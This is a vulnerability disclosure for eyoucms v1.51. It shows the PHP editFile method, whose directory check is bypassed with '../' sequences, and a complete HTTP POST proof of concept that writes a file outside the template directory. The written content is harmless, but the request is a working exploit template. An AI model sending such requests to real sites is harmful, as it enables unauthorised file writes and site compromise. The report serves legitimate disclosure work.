## Vulnerability description

A directory traversal vulnerability is found in the editFile method of the application/admin/logic/FilemanagerLogic.php file.

## Affects Version



eyoucms v1.51

## Vulnerability certificate



The location is the editFile method in the
application/admin/logic/FilemanagerLogic.php file's editFile method

```java
public function editFile($filename, $activepath = '', $content = '')
{
    $fileinfo = pathinfo($filename);
    $ext = strtolower($fileinfo['extension']);
    $filename = trim($fileinfo['filename'], '.').'.'.$fileinfo['extension'];

    /*不允许越过指定最大级目录的文件编辑*/
    $tmp_max_dir = preg_replace("#\/#i", "\/", $this->maxDir);
    if (!preg_match("#^".$tmp_max_dir."#i", $activepath)) {
        return '没有操作权限！';
    }
    /*--end*/

    /*允许编辑的文件类型*/
    if (!in_array($ext, $this->editExt)) {
        return '只允许操作文件类型如下：'.implode('|', $this->editExt);
    }
    /*--end*/

    $file = $this->baseDir."$activepath/$filename";
    if (!is_writable(dirname($file))) {
        return "请把模板文件目录设置为可写入权限！";
    }
    if ('htm' == $ext) {
        $content = htmlspecialchars_decode($content, ENT_QUOTES);
        foreach ($this->disableFuns as $key => $val) {
            $val_new = msubstr($val, 0, 1).'-'.msubstr($val, 1);
            $content = preg_replace("/(@)?".$val."(\s*)\(/i", "{$val_new}(", $content);
        }
    }
    $fp = fopen($file, "w");
    fputs($fp, $content);
    fclose($fp);
    return true;
}
```

The packet capture is as follows

![image.png](https://gitee.com/nn0nkey/picture/raw/master/img/20241105141232.png)
Grab a package is to see the parameters we can control, see the code logic



![image.png](https://gitee.com/nn0nkey/picture/raw/master/img/20241105141745.png)
You can only edit files in the maxDir directory

```java
$this->maxDir = $this->globalTpCache['web_templets_dir']; 也就是/template
```

This can be bypassed though, in fact it was found that there is no restriction on directory traversal here, we can type something like this

```java
POST /login.php?m=admin&c=Filemanager&a=edit&lang=cn HTTP/1.1
Host: eyoucms:9893
Content-Length: 60
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://eyoucms:9893
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://eyoucms:9893/login.php?m=admin&c=Filemanager&a=edit&filename=index.htm&activepath=%3Atemplate%3Apc&lang=cn
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: admin_lang=cn; home_lang=cn; users_id=1; ENV_GOBACK_URL=%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26lang%3Dcn; ENV_LIST_URL=%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26lang%3Dcn; PHPSESSID=ppkqs6v245hconq1ff7fd1tnf1; workspaceParam=welcome%7CIndex
Connection: keep-alive

activepath=/template/pc/../../&filename=b.htm&content=aaaaaa
```

![image.png](https://gitee.com/nn0nkey/picture/raw/master/img/20241105143058.png)
Open the contents and find aaaaaa that the catalog traversal was successful.

![image-20241105175834726](https://gitee.com/nn0nkey/picture/raw/master/img/image-20241105175834726.png)

